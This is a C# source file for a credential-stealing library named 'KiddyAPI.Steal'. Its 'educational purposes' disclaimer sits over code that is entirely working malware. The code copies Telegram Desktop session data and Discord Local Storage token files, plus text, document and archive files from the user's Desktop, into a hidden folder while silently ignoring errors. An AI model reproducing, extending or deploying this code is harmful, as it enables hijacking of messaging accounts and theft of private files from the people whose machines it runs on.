/////////////////////////////////////////////////////////
//// Developer : Whiro
//// For for educational purposes
//////////////////////////////////////////////////////////
using System;
using System.Diagnostics;
using System.IO;

//     | For educational purposes only, the author is not responsible.
namespace KiddyAPI.Steal
{
    public class Apps
    {
        /// <summary>
        /// Work with Telegram
        /// </summary>
        public static class Telegram
        {
            private static bool inDir = false;

            /// <summary>
            /// Get session files of Telegram
            /// </summary>
            /// <param name="pathToCopy">Path to save session.It is advisable to generate a new name every time</param>
            public static void Steal(string pathToCopy)
            {
                var processName = "Telegram";
                var getProcByName = Process.GetProcessesByName(processName);
                if (getProcByName.Length < 1)
                {
                    string tPath = Environment.ExpandEnvironmentVariables("%appdata%") +
                                         @"\Telegram Desktop\tdata";
                    CopyAll(tPath, pathToCopy + "\\Telegram");
                }
                else
                {
                    var dirTelegram = System.IO.Path.GetDirectoryName(getProcByName[0].MainModule.FileName);
                    var replace = dirTelegram.Replace("Telegram.exe", "") + @"\tdata";
                    CopyAll(replace, pathToCopy + "\\Telegram\\");
                }
            }
            //Костыль
            private static void CopyAll(string fromDir, string toDir)
            {

                DirectoryInfo di = Directory.CreateDirectory(toDir);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                foreach (string s1 in Directory.GetFiles(fromDir))
                    CopyFile(s1, toDir);

                foreach (string s in Directory.GetDirectories(fromDir))
                    CopyDir(s, toDir);
            }

            // Костыль
            private static void CopyFile(string name, string toDir)
            {
                try
                {
                    var fname = Path.GetFileName(name);

                    if (inDir && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                        return;
                    var s2 = toDir + "\\" + fname;

                    File.Copy(name, s2);
                }
                catch
                {
                }
            }

            //Костыль
            private static void CopyDir(string s, string toDir)
            {
                try
                {
                    inDir = true;
                    CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                    inDir = false;
                }
                catch
                {
                }
            }
        }

        /// <summary>
        /// Work with Desktop
        /// </summary>
        public static class Desktop
        {
            /// <summary>
            /// Get files from Desktop
            /// </summary>
            /// <param name="dirToCopy">Path to copy</param>
            /// <param name="rewrite">Re-write</param>
            public static void Steal(string dirToCopy, bool rewrite)
            {
                foreach (FileInfo file in new DirectoryInfo(
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
                {
                    if (file.Extension.Equals(".txt") || 
                        file.Extension.Equals(".docx") || file.Extension.Equals(".log") ||
                        file.Extension.Equals(".rar") || file.Extension.Equals(".zip"))
                    {
                        if (!(Directory.Exists(dirToCopy + "\\Desktop\\")))
                            Directory.CreateDirectory(dirToCopy + "\\Desktop\\");
                        file.CopyTo(dirToCopy + "\\Desktop\\" + file.Name, rewrite);
                    }
                }
            }
        }

        /// <summary>
        /// Work with Diskord
        /// </summary>
        public static class Discord
        {
            /// <summary>
            /// Get Diskord sessies files
            /// </summary>
            /// <param name="pathToCopy">Path to Copy</param>
            /// <param name="rewrite">Re-write</param>
            public static void Steal(string pathToCopy, bool rewrite)
            {
                string discordPath = Environment.ExpandEnvironmentVariables("%appdata%") +
                                     @"\Discord\Local Storage\leveldb";
                if (!(Directory.Exists(pathToCopy + "\\Discord\\")))
                    Directory.CreateDirectory(pathToCopy + @"\\Discord\\");
                foreach (var files in new DirectoryInfo(discordPath).GetFiles())
                {
                    files.CopyTo(pathToCopy + "\\Discord\\" + files.Name, rewrite);
                }
            }
        }
    }
}

